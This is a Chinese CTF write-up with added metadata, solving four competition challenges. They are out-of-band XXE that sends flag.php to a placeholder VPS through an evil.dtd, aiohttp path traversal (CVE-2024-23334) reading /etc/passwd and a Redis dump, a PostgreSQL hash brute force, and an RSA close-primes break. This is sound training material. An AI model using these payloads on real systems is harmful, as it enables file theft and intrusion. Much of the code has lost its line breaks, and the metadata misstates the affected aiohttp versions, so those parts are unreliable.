---
title: 2024"领航杯"-高职组初赛WP（一）
contest: 领航杯
year: 2024
difficulty: medium
vuln_type:
- xxe
- ssrf
- lfi
- web_unknown
- crypto_rsa
tags:
- XXE out-of-band DTD
- Aiohttp CVE-2024-23334 目录穿越
- redis dump.rdb
- PostgreSQL docker 恢复
- rockyou 字典爆破
- RSA AMM 开方
- p = next_prime(iroot(n))
attack_chain: '1. Web_sql_xxe: vi -r index.php.swp 拿源码 → 登录界面 POST XML → out-of-band XXE 读 flag.php / 2. Web_aio: aiohttp 目录穿越 CVE-2024-23334 → /static/../../../../var/lib/redis/dump.rdb / 3. Misc_PG: 蚁剑下载 pg.tar.gz → docker 启动 PostgreSQL → rockyou 爆破 hash → flag / 4. Crypto_1zRSA: p^2 ≈ n → next_prime(iroot(n)) 拿 p → AMM 算法开 e=33 次方根'
key_payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPS:8000/evil.dtd" >%dtd;%send;]> ; /static/../../../var/lib/redis/dump.rdb ; p1=gmpy2.iroot(n,2)[0] ; while n % p1 != 0: p1 = gmpy2.next_prime(p1) ; AMM(c, 33, p)'
one_liner: XXE OOB + Aiohttp 目录穿越 + Redis dump + PG docker 恢复 + RSA AMM 33次方。
lesson: aiohttp 3.9.1 之前都有 CVE-2024-23334 目录穿越；RSA p^2 接近 n 时 p = next_prime(iroot(n))。
quality: medium
full_path: 2024“领航杯”-高职组初赛WP（一）.full.md
meta_path: 2024“领航杯”-高职组初赛WP（一）.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2024"领航杯"-高职组初赛WP（一）。XXE OOB + Aiohttp 目录穿越 + Redis dump + PG docker 恢复 + RSA AMM 33次方。。经验：aiohttp 3.9.1 之前都有 CVE-2024-23334 目录穿越；RSA p^2 接近 n 时 p = ne...
category: web
subcategory: xxe
subcategories:
- xxe
- ssrf
- lfi
- web_other
- rsa
tools_used:
- gmpy2
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/219922.html
reasoning_chain:
- 触发点：Web_sql_xxe 登录界面 → 假设：备份文件泄露源码 → 动作：扫目录找 .index.php.swp
- 动作：vi -r index.php 恢复 swp → 观察：源码是 mysqli sprintf注入 + 黑名单拦截
- 假设：正则黑名单绕过很麻烦 → 触发点：源码含 XML 处理逻辑 → 假设：out-of-band XXE
- 动作：构造 <?xml version='1.0'?><!DOCTYPE a [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=flag.php' ><!ENTITY % dtd SYSTEM 'http://VPS:8000/evil.dtd'>%dtd;%send;]>
- 观察：VPS 收到 flag.php base64 → 解码出 flag
- 触发点：Web_aio 用 aiohttp → 假设：CVE-2024-23334 目录穿越 → 动作：/static/../../../../../etc/passwd
- 动作：扩展到 /var/lib/redis/dump.rdb → 观察：拿到 Redis 持久化文件
- 触发点：Misc_PG 蚁剑下载 pg.tar.gz → 假设：docker 启动 PostgreSQL → 动作：docker run -v pg.tar.gz:/tmp restore
- 动作：rockyou 字典爆破 PostgreSQL 用户 hash → 观察：拿到密码登录容器拿 flag
- 触发点：Crypto_1zRSA p² ≈ n → 假设：p = next_prime(iroot(n)) → 动作：gmpy2.iroot(n,2)[0] 起步
- 假设：e=33 次方根 → 动作：AMM(c, 33, p) → 观察：解出 flag
failed_attempts:
- 试图对 Web_sql_xxe 走普通 SQL 注入 → 失败：黑名单 select/'/"/, 等全被拦
- 试图直接 read /flag 通过 /etc/passwd → 失败：flag 不在 /etc 必须 redis 数据
- 试图用 msf redis 模块连接 → 失败：dump.rdb 需先下到本地
key_observations:
- aiohttp 3.9.1 之前都有 CVE-2024-23334 目录穿越（影响所有 static 服务）
- PHP 备份文件 .swp / .bak / .git 是源码泄露最常见入口
- OOB XXE 必须配合外部 VPS 接收 dtd 二次回传（内网无解）
- RSA p²≈n 的经典模式：next_prime(iroot(n)) 直接还原 p（仅一次爆破）
prerequisites:
- PHP 源码备份恢复（vim -r）
- OOB XXE 攻击链 + VPS接收回传
- aiohttp 漏洞数据库（CVE-2024-23334）
- SageMath AMM + gmpy2.iroot
---
# 2024“领航杯”-高职组初赛WP（一）

> 原文: https://www.ctfiot.com/219922.html
> ID: 219922

点击上方蓝字关注我们

郑重说明

数字人才创研院秉承探究学习与交流知识‍‍的原则，所有发布的技术文章仅供参考，目的在于助力你获得更多知识；与此同时，让我们共同遵守《网络安全法》，未经授权请勿利用文章中的技术内容对任何计算机系统进行非授权操作，否则对他人或单位而造成的直接或间接后果或损失，均由使用者本人负责。

   公众号发表的文章如有涉及您的侵权，烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！‍

Purpose of recommendation

推荐观点

赛事的开展不仅给广大参赛学生提供了网络安全实战平台，同时也搭建了发现人才和人才交流的平台。  竞技赛场，你追我赶，各参赛选手以竞赛活动为契机，以赛促学、以赛促训，畅享不一样“饕餮盛宴”的竞赛。  知己知彼，百战百胜，小编分享官方WriteUp，旨在让大家了解赛事赛题的难度变化与知识范畴，发现团队薄弱之处，提升团队技术能力。  推荐指数：★★★★★

01

Web_sql_xxe

打开为登录框，可能存在注入，但好像绕不过单引号

扫描一下目录，发现index.php有备份文件`.index.php.swp`

恢复备份文件，获得index.php源代码

vi -r index.php

<?phpini_set( 'display_errors', 0 );require_once("config.php");
 if(isset($_POST['submit'])) { $username=$_POST['user']; $password=$_POST['password']; if(!get_magic_quotes_gpc()) { $username=addslashes($username); $pasword=addslashes($password); } if(preg_match('/select|'|"|,|from|where|group|order|insert|update|delete|union|into|load_file|outfile|and|or|/*/i', $username)) die("Injection detected");
 $sql=sprintf("select * from users where username='$username' and password=md5('%s')",$password); $query = mysqli_query($conn,$sql); if(!$query) { die(mysqli_error($conn)); } if(mysqli_fetch_row($query)) { $_SESSION['username'] = 'admin'; echo "<meta http-equiv='refresh' content='0;url='/admin.php''>"; } else { echo "Wrong user or password!"; } mysqli_close($conn); }?>

#post提交到index.php的xml数据：<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPSIP:
8000/evil.dtd" >%dtd;%send;]>

#本地或VPS开启web监听，并提供evil.dtd供靶机访问<!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://VPSIP:
8000/?s=%file;'>">%all;

02

Web_aio

访问主页，可以看到使用了aiohttp

网上搜索Aiohttp的漏洞信息可以发现存在Aiohttp目录穿越(CVE-2024-23334)漏洞，https://ev1l0o4g.xyz/aiohttp目录穿越cve-2024-23334复现

访问以下路径实现目录穿越

/static/../../../../../etc/passwd

读取utils.py文件，可以看到使用了redis

根据redis的dump文件路径，读取/var/lib/redis/dump.rdb文件，获得flag

/static/../../../var/lib/redis/dump.rdb

03

Misc_PG

题目描述：

获取数据库users表中admin用户的密码

分析流量可以发现蚁剑的流量特征

可以发现在下载文件，可以提权文件内容，下载pg.tar.gz

进一步分析，可以发现下载了两个文件database.php 和 utils.php 记录了数据库的连接密码和hash的生成方法

需要还原数据库，可以使用docker 启动

根据解压的PG_VERSION可以知道数据库的版本

使用docker方式启动

若存在如下错误，则需要修复数据库

先用这种方式启动

成功连接数据库

根据php代码中的hash生成规则，使用rockyou字典进行爆破，获取密码 motocross

def get_hash(password): hash = hashlib.sha1(password.encode()).hexdigest() print(hash) hash_list = [hash[i:i+2] for i in range(0, len(hash), 2)] new_hash = [] for t in hash_list: if t.startswith('0'): new_hash.append(t[1:]) else: new_hash.append(t)
return ''.join(new_hash)

04

Crypto_1zRSA

from Crypto.Util.number import *from gmpy2 import *from secret import flagp = getPrime(1024)q = next_prime(p)n = p * qe = 33
m = bytes_to_long(flag)c = pow(m, e, n)print(f'n = {n}')print(f'c = {c}')

33=3*11

#coding: utf-8import gmpy2import randomimport mathimport libnumimport timefrom Crypto.Util.number import bytes_to_long,long_to_bytes
n = 20157817216833049974118616679190322575901864730668507144482957326182327740713453136333068539106100083027097757551546799575541531293312944887561483280916726369016319612934944450526019975934692298293195561411060477885773405036861008621958822147021639661752191557841624683504007344816984603147270693016174228339440038288427589158890266471648249125569765932533982185987755634089743765749564333612512194933232263756745378109393583291224010700913573540529420652068898993898479078127254056483844853346390136211506294067721897916177680505768950977554254296490057308239156157838713269319343550186321669135205346102566222209669
p1=gmpy2.iroot(n,2)[0] while n % p1 !=0: p1 = gmpy2.next_prime(p1) p=p1q=n/p
#print(p,q)assert(n==p*q)c=5550850995648431308122724561862321298330352966504532253941573060435227523644220681378247173522846277972751332156705955942551071366281109518855989368023554577347696287379088984498887267023431403241260985825192081189555696375201465274976430133175304403838370385321814599530029586724109782046451141042893149621734986470429809900193355827277275722227551304063436655735688781909919640024815423934941154264458525685654968501198690422227441772911516150511832369493008699728485535931462629750837466741030971574567414557223186771992335515743296998159321297009298268426970949419821980177125657422472184449785482615837014554125e=33
def GF(a): global p p = a
def g(a,b): global p return pow(a,b,p)

def AMM(x,e,p): GF(p) y = random.randint(1, p-1) while g(y, (p-1)//e) == 1: y = random.randint(1, p-1) print(y) print("find") #p-1 = e^t*s t = 1 s = 0 while p % e == 0: t += 1 print(t) s = p // (e**t) print('e',e) print('p',p) print('s',s) print('t',t) # s|ralpha-1 k = 1 while((s * k + 1) % e != 0): k += 1 alpha = (s * k + 1) // e a = g(y, (e ** (t - 1) ) * s) b = g(x, e * alpha - 1) c = g(y, s) h = 1 # for i in range(1, t-1): d = g(b,e**(t-1-i)) if d == 1: j = 0 else: j = -math.log(d,a) b = b * (g(g(c, e), j)) h = h * g(c, j) c = g(c, e) #return (g(x, alpha * h)) % p root = (g(x, alpha * h)) % p roots = set() for i in range(e): mp2 = root * g(a,i) %p roots.add(mp2) return roots
def check(m): if 'CnHongke' in m: print(m) return True else: return False
mps = AMM(c,e,p)for mpp in mps: solution = str(long_to_bytes(mpp)) if check(solution): print(solution) # CnHongke{a5c3895e-cb83-47aa-9674-03f8644b24c0}

如果喜欢，敬请关注，后期内容更精彩！

END


```
vi -r index.php
<?phpini_set( 'display_errors', 0 );require_once("config.php");
 if(isset($_POST['submit'])) { $username=$_POST['user']; $password=$_POST['password']; if(!get_magic_quotes_gpc()) { $username=addslashes($username); $pasword=addslashes($password); } if(preg_match('/select|'|"|,|from|where|group|order|insert|update|delete|union|into|load_file|outfile|and|or|/*/i', $username)) die("Injection detected");
 $sql=sprintf("select * from users where username='$username' and password=md5('%s')",$password); $query = mysqli_query($conn,$sql); if(!$query) { die(mysqli_error($conn)); } if(mysqli_fetch_row($query)) { $_SESSION['username'] = 'admin'; echo "<meta http-equiv='refresh' content='0;url='/admin.php''>"; } else { echo "Wrong user or password!"; } mysqli_close($conn); }?>
    #post提交到index.php的xml数据：<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPSIP:
8000/evil.dtd" >%dtd;%send;]>

#本地或VPS开启web监听，并提供evil.dtd供靶机访问<!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://VPSIP:
8000/?s=%file;'>">%all;
def get_hash(password): hash = hashlib.sha1(password.encode()).hexdigest() print(hash) hash_list = [hash[i:i+2] for i in range(0, len(hash), 2)] new_hash = [] for t in hash_list: if t.startswith('0'): new_hash.append(t[1:]) else: new_hash.append(t)
return ''.join(new_hash)
from Crypto.Util.number import *from gmpy2 import *from secret import flagp = getPrime(1024)q = next_prime(p)n = p * qe = 33
m = bytes_to_long(flag)c = pow(m, e, n)print(f'n = {n}')print(f'c = {c}')
33=3*11
    #coding: utf-8import gmpy2import randomimport mathimport libnumimport timefrom Crypto.Util.number import bytes_to_long,long_to_bytes
n = 20157817216833049974118616679190322575901864730668507144482957326182327740713453136333068539106100083027097757551546799575541531293312944887561483280916726369016319612934944450526019975934692298293195561411060477885773405036861008621958822147021639661752191557841624683504007344816984603147270693016174228339440038288427589158890266471648249125569765932533982185987755634089743765749564333612512194933232263756745378109393583291224010700913573540529420652068898993898479078127254056483844853346390136211506294067721897916177680505768950977554254296490057308239156157838713269319343550186321669135205346102566222209669
p1=gmpy2.iroot(n,2)[0] while n % p1 !=0: p1 = gmpy2.next_prime(p1) p=p1q=n/p
    #print(p,q)assert(n==p*q)c=5550850995648431308122724561862321298330352966504532253941573060435227523644220681378247173522846277972751332156705955942551071366281109518855989368023554577347696287379088984498887267023431403241260985825192081189555696375201465274976430133175304403838370385321814599530029586724109782046451141042893149621734986470429809900193355827277275722227551304063436655735688781909919640024815423934941154264458525685654968501198690422227441772911516150511832369493008699728485535931462629750837466741030971574567414557223186771992335515743296998159321297009298268426970949419821980177125657422472184449785482615837014554125e=33
def GF(a): global p p = a
def g(a,b): global p return pow(a,b,p)

def AMM(x,e,p): GF(p) y = random.randint(1, p-1) while g(y, (p-1)//e) == 1: y = random.randint(1, p-1) print(y) print("find") #p-1 = e^t*s t = 1 s = 0 while p % e == 0: t += 1 print(t) s = p // (e**t) print('e',e) print('p',p) print('s',s) print('t',t) # s|ralpha-1 k = 1 while((s * k + 1) % e != 0): k += 1 alpha = (s * k + 1) // e a = g(y, (e ** (t - 1) ) * s) b = g(x, e * alpha - 1) c = g(y, s) h = 1 # for i in range(1, t-1): d = g(b,e**(t-1-i)) if d == 1: j = 0 else: j = -math.log(d,a) b = b * (g(g(c, e), j)) h = h * g(c, j) c = g(c, e) #return (g(x, alpha * h)) % p root = (g(x, alpha * h)) % p roots = set() for i in range(e): mp2 = root * g(a,i) %p roots.add(mp2) return roots
def check(m): if 'CnHongke' in m: print(m) return True else: return False
mps = AMM(c,e,p)for mpp in mps: solution = str(long_to_bytes(mpp)) if check(solution): print(solution) # CnHongke{a5c3895e-cb83-47aa-9674-03f8644b24c0}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]